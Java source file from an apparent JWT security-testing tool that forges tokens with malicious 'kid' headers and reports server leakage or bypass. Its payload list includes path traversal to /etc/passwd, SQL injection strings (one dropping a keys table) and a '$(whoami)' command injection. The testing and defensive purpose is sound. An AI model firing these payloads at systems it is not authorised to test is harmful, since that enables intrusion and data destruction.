package rs.raf.bvs.jwttool.attacks;

import org.json.JSONObject;
import rs.raf.bvs.jwttool.http.ApiClient;
import rs.raf.bvs.jwttool.jwt.JwtCodec;
import rs.raf.bvs.jwttool.jwt.JwtParts;

// kid (Key ID) injection. Verifiers use the "kid" header to find a key in the
// DB or on disk. If kid is concatenated into SQL/path/shell without validation ->
// SQL injection / path traversal / RCE
// We send classic payloads and watch status + body for leakage (stack trace, SQL error)
public final class A8_KidInjection implements Attack {

    // malicious kid payloads, format { label, payload }
    // null in the second field means do not set the kid claim at all
    private static final String[][] PAYLOADS = {
            { "path traversal",      "../../../../etc/passwd" },
            { "SQL UNION",           "' UNION SELECT 'secret' --" },
            { "SQL OR 1=1",          "key1' OR '1'='1" },
            { "SQL DROP TABLE",      "; DROP TABLE keys; --" },
            { "command injection",   "$(whoami)" },
            { "empty string",        "" },
            { "(null - no kid)",     null }
    };

    // keywords in the body that indicate leakage, e.g. the server spews a stack trace
    private static final String[] LEAK_KEYWORDS = {
            "SQLException", "sqlexception", "SQL syntax", "syntax error",
            "Exception", "stacktrace", "stack trace",
            "no such file", "FileNotFoundException", "path",
            "ORA-", "ERROR:", "psql:"
    };

    @Override
    public AttackResult run(AttackContext ctx) throws Exception {
        AttackResult r = new AttackResult("Attack 8 - kid Header Injection");

        if (ctx.getToken() == null) {
            r.fail("No token. Log in first.");
            return r;
        }

        JwtParts orig = JwtCodec.split(ctx.getToken());
        String path;
        if (ctx.getTestEndpoint() != null) {
            path = ctx.getTestEndpoint();
        } else {
            path = "/users";
        }

        r.section("Attack context");
        r.info("We forge tokens with the same payload and signature, changing only the 'kid' header.");
        r.info("We watch: HTTP status + whether the body contains info leakage (stack trace, SQL error).");
        r.info("Target endpoint: GET " + path);

        r.section("Iterating over malicious kid values");
        boolean anyLeak = false;
        boolean anyBypass = false;

        for (int i = 0; i < PAYLOADS.length; i++) {
            String label = PAYLOADS[i][0];
            String kidValue = PAYLOADS[i][1];

            // new header, keep the original alg/typ and inject kid (or remove it if null)
            JSONObject newHeader = new JSONObject(orig.header.toString());
            if (kidValue == null) {
                newHeader.remove("kid");
            } else {
                newHeader.put("kid", kidValue);
            }

            String headerB64 = JwtCodec.b64UrlEncode(newHeader.toString());
            // old payload and signature, so the signature check will fail
            // but if the verifier uses kid for key lookup, kid is evaluated BEFORE
            // the signature check -> the injection happens earlier
            String forged = JwtCodec.assemble(headerB64, orig.payloadB64, orig.signatureB64);

            ApiClient.HttpResult res = ctx.api().get(path, forged);

            String marker = analyzeResponse(res);
            String displayKid;
            if (kidValue == null) {
                displayKid = "(no kid)";
            } else if (kidValue.isEmpty()) {
                displayKid = "\"\"";
            } else if (kidValue.length() > 40) {
                displayKid = "\"" + kidValue.substring(0, 37) + "...\"";
            } else {
                displayKid = "\"" + kidValue + "\"";
            }

            r.info(label + " kid=" + displayKid + " -> HTTP " + res.status + "  " + marker);

            if (marker.contains("LEAK")) {
                anyLeak = true;
                r.warn("Body contains a leakage indicator for payload: " + label);
                r.code("Response body (kid=" + label + ")", res.body);
            } else if (res.status == 200) {
                anyBypass = true;
                r.warn("BYPASS succeeded with kid=" + label + " - the server accepts an invalid token.");
                r.code("Forged token", forged);
            }
        }

        r.section("Conclusion");
        if (anyBypass) {
            r.warn("Server accepted at least one forged token - verification has a hole.");
            r.setSuccess(false);
        }
        if (anyLeak) {
            r.warn("Server spews an internal error in the body - info leakage risk.");
            r.setSuccess(false);
        }
        if (!anyBypass && !anyLeak) {
            r.ok("All malicious kid values rejected without info leakage.");
            r.ok("Probably: the target does not use the kid claim at all, or strictly validates its format.");
            r.setSuccess(true);
        }

        r.setConclusion("Header fields used internally as a DB or file lookup MUST be strictly validated (e.g. UUID format only) or parameterized. Otherwise SQL injection / path traversal via kid. Best practice: if you use kid, define a regex (^[a-zA-Z0-9-]{8,64}$) and reject anything outside it.");
        return r;
    }

    // return a marker for the log, LEAK has priority because it is worse than a plain 401
    private static String analyzeResponse(ApiClient.HttpResult res) {
        if (res.body != null && !res.body.isEmpty()) {
            for (int i = 0; i < LEAK_KEYWORDS.length; i++) {
                String kw = LEAK_KEYWORDS[i];
                if (res.body.contains(kw)) {
                    return "[LEAK: " + kw + "]";
                }
            }
        }
        if (res.status == 200) return "[BYPASS]";
        return "[blocked]";
    }
}
